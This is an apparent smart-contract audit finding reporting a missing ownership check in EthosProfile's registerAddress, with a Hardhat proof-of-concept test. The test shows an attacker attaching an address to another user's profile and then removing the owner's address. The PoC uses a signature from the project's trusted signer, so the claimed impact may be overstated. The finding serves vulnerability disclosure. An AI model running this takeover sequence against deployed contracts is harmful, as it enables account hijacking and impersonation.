# The `EthosProfile::registerAddress` function does not check if the profile provided in the parameters belongs to the caller

### Summary

The `EthosProfile::registerAddress` function takes in an address to add to a profileId, the profileId, a random value, and a signature(ensuring the address belongs to the caller) and adds the address to the profile. In the `EthosProfile::registerAddress` there is no check to ensure the profile provided belongs to the caller, as such any user can add their address to another user's profile, thereby having complete control over the profile.

### Root Cause

There is a missing check in the `EthosProfile::registerAddress` function at [Line#373 to Line#409](https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/contracts/EthosProfile.sol#L373-#L409) to ensure the profile provided as input belongs to the caller.

### Internal pre-conditions

- There needs to be at least one profile that has been created (i.e the `profileCount` has to be at least 2)
- The profile that the user wants to add their address to must have less than the max addresses added

### External pre-conditions

_No response_

### Attack Path

- Owner invites User A
- User A creates a profile using owner profile ID and gets a profile Id
- Attacker calls `registerAddress` with User A's profile Id and adds their address to user A's profile giving them total control over it

### Impact

The attacker now has complete control over user A's profile and can create attestations, leave reviews, vote, discuss, and even remove addresses on the profile effectively impersonating the owner of the profile. And as seen in the POC they can remove user A's address from the profile taking full control over it.

### PoC

```javascript

it('POC -- No check for if callerId == profileId', async () => {
      const { ethosProfile, PROFILE_CREATOR_0, EXPECTED_SIGNER, OTHER_0, OWNER } =
        await loadFixture(deployFixture);

      const profileId = String(2);
      const rand = '123';
      const signature = await common.signatureForRegisterAddress(
        OTHER_0.address,
        profileId,
        rand,
        EXPECTED_SIGNER,
      );
     //PROFILE_CREATOR_0 is invited and creates a new profile
      await ethosProfile.connect(OWNER).inviteAddress(PROFILE_CREATOR_0.address);
      await ethosProfile.connect(PROFILE_CREATOR_0).createProfile(1);
      
      //OTHER_0 calls registerAddress and links his address to the PROFILE_CREATOR_0 profile
      await ethosProfile
        .connect(OTHER_0)
        .registerAddress(OTHER_0.address, profileId, rand, signature);

      const adddresses = await ethosProfile.addressesForProfile(2);
      expect(adddresses.length).to.be.equal(2, 'should be 2 addresses');

      expect(adddresses[0]).to.be.equal(PROFILE_CREATOR_0.address, 'wrong address[0]');
      expect(adddresses[1]).to.be.equal(OTHER_0.address, 'wrong address[1]');

      //OTHER_0  now has full control of PROFILE_CREATOR_0 profile and can leave reviews, vote, add replies and even remove addresses on behalf of PROFILE_CREATOR_0 profile
      //OTHER_O removes PROFILE_CREATOR_0 address from the profile
      await ethosProfile.connect(OTHER_0).deleteAddressAtIndex(0);
      const adddressesD = await ethosProfile.addressesForProfile(2);
      expect(adddressesD.length).to.be.equal(1, 'should be 1 address');

      expect(adddressesD[0]).to.be.equal(OTHER_0.address, 'wrong address[0]');
      
    });
```

### Mitigation

Add a call to the `EthosProfile::addressBelongsToProfile` function (which checks if an address is linked to a profile) to the `EthosProfile::registerAddress` function to ensure the caller is linked to the profile they want to add an address to.
